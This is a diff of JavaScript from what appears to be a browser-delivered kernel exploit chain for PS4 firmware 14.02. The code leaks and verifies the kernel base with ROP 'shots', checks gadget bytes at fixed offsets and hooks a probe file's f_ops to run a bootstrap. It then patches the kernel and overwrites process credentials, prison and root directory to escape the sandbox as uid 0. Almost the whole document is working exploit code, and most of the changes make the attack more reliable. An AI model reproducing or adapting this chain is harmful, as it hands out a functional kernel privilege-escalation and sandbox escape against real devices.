+     existing hard limit allows. */
+  const limits = alloc(16);
+  wipe(limits, 16);
+  if (sc(S.getrlimit, 8, limits.at).i32 !== 0) {
+    say("[0] could not read RLIMIT_NOFILE, errno " + host().errno() +
+      "; no kernel shot fired");
+    return false;
+  }
+  let soft = qAt(limits, 0), hard = qAt(limits, 8);
+  say("[0] descriptor limit soft=" + text(soft) + " hard=" + text(hard));
+  const atLeast = function (limit, count) {
+    return (limit.hi >>> 0) !== 0 || (limit.low >>> 0) >= count;
+  };
+  if (!atLeast(hard, 512)) {
+    say("[0] hard descriptor limit is below 512; no kernel shot fired");
+    return false;
+  }
+  let descriptorTarget = atLeast(hard, 1024) ? 1024 : 512;
+  STATE.taperSeed = descriptorTarget === 512;
+  if (!atLeast(soft, descriptorTarget)) {
+    limits.dv.setUint32(0, descriptorTarget, true);
+    limits.dv.setUint32(4, 0, true);
+    if (sc(S.setrlimit, 8, limits.at).i32 !== 0) {
+      say("[0] could not raise the soft descriptor limit, errno " + host().errno() +
+        "; no kernel shot fired");
+      return false;
+    }
+    wipe(limits, 16);
+    if (sc(S.getrlimit, 8, limits.at).i32 !== 0) {
+      say("[0] could not verify the raised descriptor limit, errno " + host().errno() +
+        "; no kernel shot fired");
+      return false;
+    }
+    soft = qAt(limits, 0); hard = qAt(limits, 8);
+    say("[0] raised descriptor limit soft=" + text(soft) + " hard=" + text(hard));
+    if (!atLeast(soft, descriptorTarget)) {
+      say("[0] descriptor limit stayed below " + descriptorTarget +
+        "; no kernel shot fired");
+      return false;
+    }
+  }
+
+  /* Pin only when every read-only userland preflight has passed and the first
+     kernel shot is about to be prepared. Earlier exits now leave affinity
+     untouched. */
+  const pin = pinCore();
+  if (!pin.ok) {
+    say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
+    say("  Unpinned, the free and the refill land in different per cpu buckets,");
+    say("  the hole is filled by somebody else, and ring 0 continues on that");
+    say("  stranger's stack pointer. That is a dead console, not a bad run.");
+    return false;
+  }
+  say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");
+
   const shot = shooter(gad);
   const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);
 
-  /* ---- the kernel base ------------------------------------------------- */
-
-  let kbase = STATE.base;
-  if (kbase) {
-    say("[1] base " + text(kbase) + ", carried over from this boot");
-  } else {
+  let kbase = null;
+  const header = alloc(0x200), headerRef = alloc(16);
+  {
     const win = alloc(TUNE.window + 16);
     wipe(win, TUNE.window + 16);
 
+    if (!await checkpoint("leak-armed", "first kernel read shot")) {
+      say("[1] PC collector did not acknowledge the shot"); return false;
+    }
+    if (typeof ctx.markKernelStageEntered === "function")
+      ctx.markKernelStageEntered();
     const r = shot.take(function (c) {
-      /* round down to the start of the slab, so the window also covers the
-         neighbours that sit below the freed object */
       c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
       c.grab(win.at, TUNE.window);
     });
 
-    const at = function (off) { return qAt(win, off); };
+    if (!ran(r)) { say("[1] kernel leak shot missed; power off before another attempt"); return false; }
+    const base = deriveBaseFromLeak(win.u8.subarray(0, TUNE.window), K.anchor);
+    if (!base) { say("[1] two independent kernel base checks did not agree"); return false; }
+    kbase = v(base.low, base.hi);
+    say("[1] checked kernel base " + text(kbase));
 
-    /* four kernel pointers spaced 0x20/0x40/0x50 apart identify the object */
-    let found = null;
-    for (let off = 0; off <= TUNE.window - 0x20; off += 8) {
-      const a = at(off);
-      if (a.hi === 0xffffffff) {
-        const b = at(off + 8), c2 = at(off + 0x10), d = at(off + 0x18);
-        if (b.hi === 0xffffffff && c2.hi === 0xffffffff && d.hi === 0xffffffff
-            && ((b.low - a.low) >>> 0) === 0x20
-            && ((c2.low - a.low) >>> 0) === 0x40
-            && ((d.low - a.low) >>> 0) === 0x50) { found = a; break; }
-      }
-    }
-
-    /* One pointer is enough on its own: the base sits on a 16 KiB grid, so
-       the anchor can only ever show up at a single offset within a page. This
-       runs even when the signature matched, because two methods that agree
-       are worth more than one that cannot be checked -- and a wrong base
-       sends the next chain straight through a nonsense descriptor table,
-       which is the likeliest way this step takes the console with it. */
-    let voted = null;
-    {
-      const mark = K.anchor % 0x4000, tally = {};
-      for (let off = 0; off <= TUNE.window - 8; off += 8) {
-        const a = at(off);
-        if (a.hi === 0xffffffff && a.low !== 0xffffffff && a.low % 0x4000 === mark) {
-          const b = (a.low - K.anchor) >>> 0;
-          if (b % 0x4000 === 0) tally[b] = (tally[b] || 0) + 1;
-        }
-      }
-      let best = null, top = 0, second = 0;
-      for (const b in tally) {
-        const n = tally[b];
-        if (n > top) { second = top; best = Number(b); top = n; }
-        else if (n > second) second = n;
-      }
-      if (best !== null && top > second) voted = v(best + K.anchor, 0xffffffff);
-    }
-
-    if (found && voted && !same(found, voted)) {
-      say("[1] the two readings disagree: " + text(found) + " against " + text(voted)
-          + " -- stopping here");
-      return false;
-    }
-    found = found || voted;
-    if (found && ((found.low - K.anchor) >>> 0) % 0x4000 !== 0) {
-      const rem = ((found.low - K.anchor) >>> 0) % 0x4000;
-      const delta = rem <= 0x2000 ? rem : -(0x4000 - rem);
-      const oldA = K.anchor;
-      K.anchor += delta;
-      say("[1] anchor grid-shifted " + delta + ": 0x" + oldA.toString(16) + " -> 0x" + K.anchor.toString(16));
-    }
-
-    say("[1] leak: queue=" + r + " sprays=" + shot.sprayed + " anchor="
-        + (found ? text(found) : "missed")
-        + ((found && voted && same(found, voted)) ? " (both readings agree)" : ""));
-    if (!found) {
-      if (r === null && shot.sprayed === 0) {
-        say("    no free apm unit left -- this boot is spent, reboot the console.");
-      } else {
-        say("    the spray did not take");
-        STATE.retry = true;
-      }
-      return false;
-    }
-    kbase = plus(found, -K.anchor);
-    STATE.base = kbase;
-    say("    base " + text(kbase));
+    wipe(header, 0x200);
+    pokeAt(headerRef, 0, kbase);
   }
 
-  /* ---- scan for shifted kernel gadgets (14.02 auto-resolve) ----------- */
   {
     const SCAN_WIN = 0x1000;
-    const SCAN_PRE = 0x200;
+    const SCAN_PRE = K.swap_rbp - 0xa80d68;
     const scanBuf = alloc(SCAN_WIN + 16);
     wipe(scanBuf, SCAN_WIN + 16);
     const scanRef = alloc(16);
     pokeAt(scanRef, 0, plus(kbase, K.swap_rbp - SCAN_PRE));
+    const stockSpecs = PATCH_WINDOWS.concat(BOOTSTRAP_WINDOWS);
+    const stockRefs = [], stockOut = [];
+    for (const spec of stockSpecs) {
+      const ref = alloc(16), out = alloc(8);
+      pokeAt(ref, 0, plus(kbase, spec[0])); wipe(out, 8);
+      stockRefs.push(ref); stockOut.push(out);
+    }
+    const sysentRef = alloc(16), sysentOut = alloc(0x30);
+    pokeAt(sysentRef, 0, plus(kbase, 0x1102d80)); wipe(sysentOut, 0x30);
+    const gsRef = alloc(16), gsOut = alloc(11);
+    pokeAt(gsRef, 0, plus(kbase, 0x74de23)); wipe(gsOut, 11);
 
+    if (!await checkpoint("preflight-armed", "gadget and exact stock window read")) {
+      say("[1b] PC collector did not acknowledge the shot"); return false;
+    }
     const scanR = shot.take(function (c) {
+      c.load_rax(headerRef.at);
+      c.grab(header.at, 0x200);
       c.load_rax(scanRef.at);
       c.grab(scanBuf.at, SCAN_WIN);
-    }, 0x400);
+      for (let i = 0; i < stockRefs.length; i++) {
+        c.load_rax(stockRefs[i].at);
+        c.grab(stockOut[i].at, 8);
+      }
+      c.load_rax(sysentRef.at);
+      c.grab(sysentOut.at, 0x30);
+      c.load_rax(gsRef.at);
+      c.grab(gsOut.at, 11);
+    }, 0x1000);
 
     say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));
 
     if (ran(scanR)) {
+      if (!validateKernelHeader(header.u8,
+          { low: kbase.low >>> 0, hi: kbase.hi >>> 0 })) {
+        say("[1a] live 14.02 ELF text layout failed validation");
+        return false;
+      }
+      say("[1a] live 14.02 ELF text layout verified");
       const sb = rdbuf(scanBuf.at, SCAN_WIN);
-      let hit = -1;
+      const hits = [];
       for (let i = 0; i < SCAN_WIN - 2; i++) {
-        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) { hit = i; break; }
+        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) hits.push(i);
       }
-      if (hit >= 0) {
-        const realRVA = K.swap_rbp - SCAN_PRE + hit;
-        const delta = realRVA - K.swap_rbp;
-        say("[1b] swap_rbp at scan+" + hit + " rva=0x" + realRVA.toString(16)
-            + (delta !== 0 ? (" (shifted " + delta + ")") : " (same)"));
-        K.swap_rbp = realRVA;
-      } else {
-        say("[1b] swap_rbp 4e95c3 not in window -- using original, expect crash");
+      if (hits.length !== 1 || 0xa80d68 + hits[0] !== 0xa81478) {
+        say("[1b] unique verified 14.02 swap gadget absent -- stopping");
+        return false;
       }
+      say("[1b] unique 14.02 swap gadget verified at 0xa81478");
     } else {
-      say("[1b] scan shot missed -- using original K.swap_rbp");
+      say("[1b] gadget scan shot missed -- stopping");
+      return false;
     }
+    for (let i = 0; i < stockSpecs.length; i++) {
+      if (!sameBytes(stockOut[i].u8, unhex(stockSpecs[i][1]))) {
+        say("[1c] stock kernel window mismatch at 0x" + stockSpecs[i][0].toString(16));
+        return false;
+      }
+    }
+    const sd = sysentOut.dv;
+    const sycall = qAt(sysentOut, 8);
+    if (sd.getUint32(0, true) !== 0 || sd.getUint32(4, true) !== 0 ||
+        !same(sycall, plus(kbase, 0x1c07a0)) || sd.getUint32(0x10, true) !== 0 ||
+        sd.getUint32(0x14, true) !== 0 || sd.getUint32(0x18, true) !== 0 ||
+        sd.getUint32(0x1c, true) !== 0 || sd.getUint32(0x20, true) !== 0 ||
+        sd.getUint32(0x24, true) !== 0 || sd.getUint32(0x28, true) !== 0 ||
+        sd.getUint32(0x2c, true) !== 4) {
+      say("[1c] stock sysent[11] differs from the 14.02 preimage");
+      return false;
+    }
+    say("[1c] 22 exact host and bootstrap windows plus sysent[11] verified");
+    if (!sameBytes(gsOut.u8, unhex("65488b0425000000005dc3"))) {
+      say("[1c] GS thread gadget differs from the 14.02 preimage");
+      return false;
+    }
+    say("[1c] GS thread gadget verified");
   }
 
-
   const kat = function (rva) { return plus(kbase, rva); };
-
-  /* ---- handles and mappings, in one chain ------------------------------ */
 
   let probe = -1, node = null;
   for (let i = 0; i < PROBE_NODES.length && probe < 0; i++) {
@@ -2211,6 +1469,47 @@ async function attempt(ctx, opts) {
     if (probe >= 0) node = PROBE_NODES[i];
   }
   if (probe < 0) { say("[2] no device node opened for the probe descriptor"); return false; }
+
+  /* This browser rejects fcntl even for F_GETFD. Grow fd_ofiles without
+     choosing or replacing a descriptor: dup() always returns the lowest free
+     slot. Keep duplicates only until the returned number proves the table's
+     capacity, then close every duplicate while the original probe stays open.
+     FreeBSD grows fd_ofiles but does not shrink it on close. */
+  const duplicates = [];
+  /* Full seeding can peak above fd 900, so prove the entire 1024-slot route;
+     merely reaching 768 would not prove the process-wide ceiling is enough. */
+  const preferred = STATE.taperSeed ? 511 : 1023;
+  let highest = -1, dupErrno = 0;
+  while (highest < preferred && duplicates.length < descriptorTarget) {
+    const fd = sc(S.dup, probe).i32;
+    if (fd < 0) { dupErrno = host().errno(); break; }
+    duplicates.push(fd);
+    if (fd > highest) highest = fd;
+  }
+  let closeErrno = 0;
+  for (let i = duplicates.length - 1; i >= 0; i--) {
+    if (sc(S.close, duplicates[i]).i32 !== 0 && closeErrno === 0)
+      closeErrno = host().errno();
+  }
+  if (closeErrno !== 0) {
+    say("[2] temporary descriptor cleanup failed, errno " + closeErrno +
+      "; no more kernel shots; cold power off before retry");
+    return false;
+  }
+  if (highest >= 1023) {
+    descriptorTarget = 1024;
+    STATE.taperSeed = false;
+  } else if (highest >= 511) {
+    descriptorTarget = 512;
+    STATE.taperSeed = true;
+  } else {
+    say("[2] dup could only reach fd " + highest + ", errno " + dupErrno +
+      "; no more kernel shots; cold power off before retry");
+    return false;
+  }
+  say("[2] descriptor table reached temporary fd " + highest +
+    " with " + duplicates.length + " safe duplicates" +
+    (STATE.taperSeed ? "; original seed taper is active" : ""));
 
   for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
     if (rd4(plus(hostFree, off)) !== 0) {
@@ -2221,192 +1520,138 @@ async function attempt(ctx, opts) {
   say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
       + " bytes of spare room behind libc");
 
-  /* How far the kernel side has to be walked. The listing already told us
-     where the host page sits; one entry of slack, and never more than the
-     table we allocated for. */
-  let reach = TUNE.entries;
+  let reach = null;
   if (MAPS) {
     for (let i = 0; i < MAPS.length; i++) {
       const a0 = MAPS[i][0], b0 = MAPS[i][1];
       const above = a0.hi < hostPage.hi || (a0.hi === hostPage.hi && a0.low <= hostPage.low);
       const below = hostPage.hi < b0.hi || (hostPage.hi === b0.hi && hostPage.low < b0.low);
-      if (above && below) { reach = Math.min(TUNE.entries, i + 2); break; }
+      if (above && below) { reach = i + 2; break; }
     }
+  }
+  if (!reach || reach > 192 || shot.fired + 4 > TUNE.units) {
+    say("[3a] mapped host page exceeds the compact read and FD budget");
+    return false;
   }
   say("[3a] walking " + reach + " of " + TUNE.entries + " entries"
       + (MAPS ? (", " + MAPS.length + " mapped") : ""));
 
-  const note = alloc(128), ftab = alloc(0x100);
-  const maps = alloc(TUNE.entries * TUNE.stride + 0x100);
-  wipe(note, 128); wipe(ftab, 0x100); wipe(maps, TUNE.entries * TUNE.stride);
-
-  /* Four shots or three: the walk through the mapping list can ride along
-     with the handle chain or cost a shot of its own. Separate is the form
-     that has evidence behind it; merged is one shot fewer, and so one more
-     chance of the hole being won by something else. */
-  const merged = ((ctx.params && ctx.params.get("shots")) || "3") === "3";
-
-  const walkLoop = function (c) {
-    for (let k = 0; k < reach; k++) {
-      const src = c.grab(plus(maps.at, k * TUNE.stride), TUNE.stride);
-      c.load_rax(c.where(src));
-      c.gad("load8");
-    }
-  };
-
-  const r2 = shot.take(function (c) {
-    c.slot(kat(K.swap_rbp));
-    c.save_rax(note.at);
-    c.slot(kat(K.swap_rbp));
-    c.load_rax(note.at);
-    c.follow(0);
-    c.follow(-0x148);                 /* thread */
-    c.save_rax(plus(note.at, 8));
-    c.gad("load8");                   /* process */
-    c.save_rax(plus(note.at, 16));
-    c.follow(0x48);                   /* descriptor table */
-    c.follow(0);                      /* open file array */
-    c.follow(probe * 8);              /* our file */
-    c.save_rax(plus(note.at, 40));
-    c.gad("load8");                   /* its operation table */
-    c.save_rax(plus(note.at, 48));
-    c.grab(ftab.at, 0x58);
-
-    if (merged) {
-      c.load_rax(plus(note.at, 16));  /* process again, memcpy clobbered rax */
-      c.follow(0x168);                /* address space */
-      c.gad("load8");                 /* first mapping */
-      walkLoop(c);
-    }
-  }, merged ? 0x1000 + reach * 0x100 : 0x1000);
-
-  const file = qAt(note, 40), ops = qAt(note, 48);
-  say("[3] chain=" + (r2 === null ? ("null -- " + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
-  if (!inHeap(file) || !inText(ops)) {
-    say("    handles implausible -- nothing written"); STATE.retry = true; return false;
-  }
-
-  let sane = 0;
-  for (let k = 0; k < 10; k++) if (inText(qAt(ftab, k * 8))) sane++;
-  if (sane < 6) { say("    operation table unusable, " + sane + " of 10"); return false; }
-
-  let r2b = -1;
-  if (!merged) {
-    r2b = shot.take(function (c) {
-      c.slot(kat(K.swap_rbp));
-      c.save_rax(note.at);
-      c.slot(kat(K.swap_rbp));
-      c.load_rax(note.at);
-      c.follow(0);
-      c.follow(-0x148);               /* thread */
-      c.gad("load8");                 /* process */
-      c.follow(0x168);                /* address space */
-      c.gad("load8");                 /* first mapping */
-      walkLoop(c);
-    }, 0x1000 + reach * 0x100);
-    say("[3b] address space walked, chain="
-        + (r2b === null ? ("null -- " + shot.why) : r2b));
-    if (!ran(r2b)) {
-      say("    the chain did not run -- the hole was refilled with a real object");
-      STATE.retry = true;
-      return false;
-    }
-  }
-
-
-
-  /* ---- the mapping that covers the host page --------------------------- */
-
-  let hit = null, walked = 0;
-  for (let k = 0; k < reach; k++) {
-    const from = qAt(maps, k * TUNE.stride + 0x20);
-    const upto = qAt(maps, k * TUNE.stride + 0x28);
-    if (from.low === 0 && from.hi === 0 && upto.low === 0 && upto.hi === 0) break;
-    /* the list is circular and its head spans the whole address space, so it
-       matches everything. Anything wider than a terabyte is that head. */
-    if (upto.hi - from.hi > 0x100) break;
-    walked = k + 1;
-    const above = from.hi < hostPage.hi || (from.hi === hostPage.hi && from.low <= hostPage.low);
-    const below = hostPage.hi < upto.hi || (hostPage.hi === upto.hi && hostPage.low < upto.low);
-    if (above && below) { hit = k; break; }
-  }
-  if (hit === null) { say("[4] no mapping covers the host page, " + walked + " walked"); return false; }
-  /* the address of entry k is the forward pointer of entry k-1, so the first
-     entry has nothing to take it from */
-  if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); return false; }
+  const captured = await captureHostState(shot, kbase, probe, reach, hostPage);
+  if (!captured) return false;
+  const { file, ops, ftab, maps, hit, here } = captured;
 
   const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
   const locked = maps.dv.getUint32(hit * TUNE.stride + 0x88, true);
-  const here = qAt(maps, (hit - 1) * TUNE.stride + 0x08);
   const now = rights % 256, ceiling = Math.floor(rights / 256) % 256;
 
   say("[4] mapping " + hit + " at " + text(here) + " rights=0x" + now.toString(16)
       + " ceiling=0x" + ceiling.toString(16));
-  if (locked % 2 === 1 || !inHeap(here) || now === 0 || ceiling === 0
-      || Math.floor(now / 4) % 2 !== 1) {
+  /* PS4 may keep its auxiliary 0x10 protection bit in max_protection.
+     Accept only the two exact RX forms observed in the supported layouts;
+     unknown auxiliary bits still stop before any kernel write. */
+  if ((locked & 3) !== 0 || !inHeap(here) || (here.low & 7) !== 0 ||
+      now !== 5 || (ceiling !== 5 && ceiling !== 0x15)) {
     say("    not the mapping we want -- nothing written"); return false;
   }
 
-  /* ---- widen it, take over the file, run the bootstrap ----------------- */
+  const guardRightsRef = alloc(16), guardOpsRef = alloc(16);
+  const guardRightsOut = alloc(4), guardOpsOut = alloc(8);
+  pokeAt(guardRightsRef, 0, plus(here, 0x5c));
+  pokeAt(guardOpsRef, 0, plus(file, 8));
+  wipe(guardRightsOut, 4); wipe(guardOpsOut, 8);
+  if (!await checkpoint("writer-guard-armed", "re-read VM rights and probe f_ops")) {
+    say("[4] PC collector did not acknowledge the write guard"); return false;
+  }
+  const guardShot = shot.take(function (c) {
+    c.load_rax(guardRightsRef.at); c.grab(guardRightsOut.at, 4);
+    c.load_rax(guardOpsRef.at); c.grab(guardOpsOut.at, 8);
+  });
+  if (!ran(guardShot) || guardRightsOut.dv.getUint32(0, true) !== rights ||
+      !same(qAt(guardOpsOut, 0), ops)) {
+    say("[4] live write targets changed; no kernel write attempted"); return false;
+  }
 
-  /* the page already reads and executes; all it lacks is write. Touching the
-     execute bit here is what broke every earlier attempt. */
-  let widened = rights;
-  if (Math.floor(widened / 0x200) % 2 === 0) widened += 0x200;
-
-  const wRights = alloc(16); wRights.dv.setUint32(0, widened >>> 0, true);
+  /* Change only max_protection's CPU-write bit (0x02), preserving the
+     current byte and PS4's auxiliary 0x10 bit byte-for-byte. */
+  const widenedCeiling = ceiling | 0x02;
+  const wCeiling = alloc(16); wCeiling.u8[0] = widenedCeiling;
   const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
-  pokeAt(ftab, 0x18, hostFree);                      /* the ioctl slot */
+  pokeAt(ftab, 0x18, hostFree);
 
+  if (!await checkpoint("writer-armed", "first kernel writes: VM rights and probe f_ops")) {
+    say("[5] PC collector did not acknowledge the writer"); return false;
+  }
   const r3 = shot.take(function (c) {
-    c.put(plus(here, 0x5c), wRights.at, 4);
+    c.put(plus(here, 0x5d), wCeiling.at, 1);
     c.put(plus(file, 0x08), wTable.at, 8);
   });
   say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
-  if (!ran(r3)) { say("    chain did not run -- kernel untouched"); STATE.retry = true; return false; }
+  if (!ran(r3)) {
+    say("[5] writer did not return; kernel state is unknown. Keep page open and cold power off");
+    return false;
+  }
 
   if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
-    say("    page did not turn writable -- not calling into it"); return false;
+    say("[5] page did not turn writable; file hook may remain. Cold power off"); return false;
   }
-  const boot = unhex(bootstrapHex);
+  const boot = unhex(BOOTSTRAP);
 
   wrbuf(hostFree, boot);
   if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
-    say("    bootstrap did not stick"); return false;
+    say("[5] bootstrap copy failed; file hook may remain. Cold power off"); return false;
   }
 
   const m1 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
-  const before = sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32;
-  sc(S.ioctl, probe, 0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at);
+  const m1Good = m1.i32 !== -1 && (m1.hi >>> 0) !== 0;
+  const before = m1Good ? sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32 : -1;
+  if (!await checkpoint("bootstrap-armed", "ioctl will invoke the verified 14.02 bootstrap"))
+    say("[5] PC collector did not acknowledge bootstrap; restoring hook remains essential");
+  const ioctlRv = sc(S.ioctl, probe,
+    0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at).i32;
+  const ioctlErrno = ioctlRv === 0 ? 0 : host().errno();
   const m2 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
-  const after = sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32;
+  const m2Good = m2.i32 !== -1 && (m2.hi >>> 0) !== 0;
+  const after = m2Good ? sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32 : -1;
+  say("[6] bootstrap ioctl=" + ioctlRv + " errno=" + ioctlErrno +
+      " rwx before=" + before + " after=" + after);
+  await checkpoint("bootstrap-returned", "ioctl=" + ioctlRv + " rwx=" + before + "/" + after);
 
-  /* The file has to go back before anything closes it, or fo_close walks into
-     the forged table. The gate is planted by now, so that one word need not
-     cost another trigger: each trigger is a chance for a foreign allocation
-     to win the hole, and the pivot then loads a stack pointer out of someone
-     else's object. The trigger stays as the fallback -- when the bootstrap
-     did not run, there is no gate to write through. */
+  /* These anonymous mappings are only permission probes. Their results have
+     already been captured, so release both before any payload allocation. */
+  const m1Unmap = m1Good ? sc(S.munmap, v(m1.lo, m1.hi), 0x4000).i32 : 0;
+  const m2Unmap = m2Good ? sc(S.munmap, v(m2.lo, m2.hi), 0x4000).i32 : 0;
+  if (m1Unmap !== 0 || m2Unmap !== 0)
+    say("[6] permission-probe unmap failed " + m1Unmap + "/" + m2Unmap);
+
   const k = openRing0(hostFree);
   const thread = (before !== 0 && after === 0) ? k.thread() : null;
   const gated = thread !== null && inHeap(thread);
 
-  if (!(gated && k.write_v(plus(file, 0x08), ops))) {
-    const wOld = alloc(16); pokeAt(wOld, 0, ops);
-    shot.take(function (c) { c.put(plus(file, 0x08), wOld.at, 8); });
+  if (!gated) {
+    say("[6] gate unavailable; probe cannot be safely closed. Keep page open and cold power off");
+    return false;
   }
-  sc(S.close, probe);
+  await checkpoint("restore-armed", "restoring original probe f_ops pointer");
+  const restoreWritten = k.write_v(plus(file, 0x08), ops);
+  const restoredOps = restoreWritten ? k.read_v(plus(file, 0x08)) : null;
+  if (!restoredOps || !same(restoredOps, ops)) {
+    say("[6] probe f_ops was not verified restored. Keep page open and cold power off");
+    return false;
+  }
+  const probeClose = sc(S.close, probe).i32;
+  if (probeClose !== 0) {
+    say("[6] probe close failed; cold power off after this page");
+    return false;
+  }
+  await checkpoint("restore-complete", "probe f_ops restored and descriptor closed");
 
-  if (before === 0 || after !== 0) {
-    say("[6] kernel unchanged, rwx " + before + " before and " + after + " after -- "
+  if (ioctlRv !== 0 || !m1Good || !m2Good || before === 0 || after !== 0) {
+    say("[6] bootstrap result failed, rwx " + before + " before and " + after + " after -- "
         + shot.fired + " shots used");
     return false;
   }
   say("[6] kernel patched, rwx is open -- " + shot.fired + " shots used");
 
-  /* ---- everything from here runs through the gate ---------------------- */
-
-  if (!gated) { say("[7] the gate did not answer"); return false; }
   const base2 = k.base();
   if (!base2 || !same(base2, kbase)) {
     say("[7] the gate reports " + (base2 ? text(base2) : "nothing")
@@ -2415,12 +1660,6 @@ async function attempt(ctx, opts) {
   }
   say("[7] gate is live, thread " + text(thread));
 
-  /* From here the kernel is open AND the handles are armed. Any abort
-     between here and [10] used to leave them that way. The next process exit
-     then ends every fo_close in apmclose -> destroy_dev_sched, the exit never
-     completes, and the browser cannot even be restarted -- closing it IS that
-     exit. Only a console restart recovers from it. `ofs` hangs off `thread`
-     alone, so it can be derived here. */
   const failOut = function (why) {
     say(why);
     try {
@@ -2438,71 +1677,56 @@ async function attempt(ctx, opts) {
     return false;
   };
 
-
-  /* On 14.02, validate every complete retail window before changing any of
-     them. There is no scanning, shifting or one-byte guess. */
-  if (patchWindows) {
-    for (let i = 0; i < patchWindows.length; i++) {
-      const spec = patchWindows[i];
-      const pristine = unhex(spec[1]);
-      const replacement = unhex(spec[2]);
-      const after = new Uint8Array(pristine.length);
-      after.set(pristine); after.set(replacement);
-      const got = k.read(kat(spec[0]), pristine.length);
-      if (!got || (!sameBytes(got, pristine) && !sameBytes(got, after))) {
-        return failOut("[7b] exact 14.02 window mismatch at 0x"
-          + spec[0].toString(16) + " (" + spec[3] + ") -- no patches written");
-      }
-    }
-    say("[7b] all " + patchWindows.length + " exact 14.02 patch windows verified");
+  for (const spec of PATCH_WINDOWS) {
+    const stock = unhex(spec[1]);
+    const got = k.read(kat(spec[0]), stock.length);
+    if (!got || !sameBytes(got, stock))
+      return failOut("[7b] exact 14.02 stock window changed at 0x" +
+        spec[0].toString(16) + " -- no host patch written");
   }
+  say("[7b] all 15 exact 14.02 host patch windows still stock");
 
-  if (!k.apply(kbase, patches)) { return failOut("[8] the patch pass did not return"); }
+  if (!k.apply(kbase, PATCHES)) { return failOut("[8] the patch pass did not return"); }
   let done = 0, failed = null;
-  for (let i = 0; i < patches.length; i++) {
-    const bytes = unhex(patches[i][1]);
-    const got = k.read(kat(patches[i][0]), bytes.length);
-    if (got && sameBytes(got, bytes)) done++; else failed = failed || patches[i][2];
+  for (let i = 0; i < PATCHES.length; i++) {
+    const bytes = unhex(PATCHES[i][1]);
+    const got = k.read(kat(PATCHES[i][0]), bytes.length);
+    if (got && sameBytes(got, bytes)) done++; else failed = failed || PATCHES[i][2];
   }
-  say("[8] " + done + " of " + patches.length + " kernel patches in place"
+  say("[8] " + done + " of " + PATCHES.length + " kernel patches in place"
       + (failed ? (" -- first missing: " + failed) : ""));
-  if (done < patches.length) { return failOut("     refusing to go on with a half patched kernel"); }
+  if (done < PATCHES.length) { return failOut("     refusing to go on with a half patched kernel"); }
 
   const proc = k.read_v(plus(thread, 0x08));
   const fdt = proc && k.read_v(plus(proc, 0x48));
   const ofs = fdt && k.read_v(fdt);
   if (!ofs || !inHeap(ofs)) { return failOut("[9] descriptor table unreadable"); }
 
-  /* ---- out of the sandbox --------------------------------------------- */
-
   const ucred = proc && k.read_v(plus(proc, 0x40));
   if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }
 
+  const prison0 = k.read_v(kat(K.prison0));
+  const rootvnode = k.read_v(kat(K.rootvnode));
+  if (!prison0 || !inText(prison0) ||
+      !rootvnode || !inHeap(rootvnode))
+    return failOut("[9] prison0 or rootvnode failed validation before credential writes");
+
   const z4 = new Uint8Array([0, 0, 0, 0]);
   const offs = [0x04, 0x08, 0x0c, 0x14];
-  for (let i = 0; i < offs.length; i++) k.write(plus(ucred, offs[i]), z4);
-  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));   /* cr_ngroups */
-
-  const prison0 = k.read_v(kat(K.prison0));
-  if (!prison0 || !inText(prison0)) {
-    return failOut(
-      "[9] prison0 pointer is " + (prison0 ? text(prison0) : "unreadable")
-        + " -- not touching credentials",
-    );
-  }
-  k.write_v(plus(ucred, 0x30), prison0);                      /* cr_prison */
+  for (let i = 0; i < offs.length; i++)
+    if (!k.write(plus(ucred, offs[i]), z4))
+      return failOut("[9] credential group write failed");
+  if (!k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0])) ||
+      !k.write_v(plus(ucred, 0x30), prison0))
+    return failOut("[9] credential root or prison write failed");
   const caps = new Uint8Array(16); caps.fill(0xff);
-  k.write(plus(ucred, 0x60), caps);
-
-  const rootvnode = k.read_v(kat(K.rootvnode));
-  if (!rootvnode || !inHeap(rootvnode)) { return failOut("[9] rootvnode is not set"); }
-  k.write_v(plus(fdt, 0x10), rootvnode);                      /* fd_rdir */
-  k.write_v(plus(fdt, 0x18), rootvnode);                      /* fd_jdir */
+  if (!k.write(plus(ucred, 0x60), caps) ||
+      !k.write_v(plus(fdt, 0x10), rootvnode) ||
+      !k.write_v(plus(fdt, 0x18), rootvnode))
+    return failOut("[9] capability or root directory write failed");
 
   if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
   say("[9] jailbroken, uid 0");
-
-  /* ---- hand the host its kernel interface ------------------------------ */
 
   const iface = {
     base: kbase,
@@ -2532,225 +1756,302 @@ async function attempt(ctx, opts) {
     },
     read8: function (at) { return k.read_v(at); },
     write8: function (at, q) { return k.write_v(at, q); },
-    /* On this platform the loader tables are text relative -- the PS4 row
-       carries PRISON0 0x111fa18 and ROOTVNODE 0x2136e90, the same values used
-       above against this base -- so data_base holds it too. */
     data_base: kbase,
   };
 
-  /* Every attempt leaves device handles and a queue behind. Closing them now
-     kills the console, and leaving them kills it when the process exits.
-     release_handles does neither; it has to run before anything closes. */
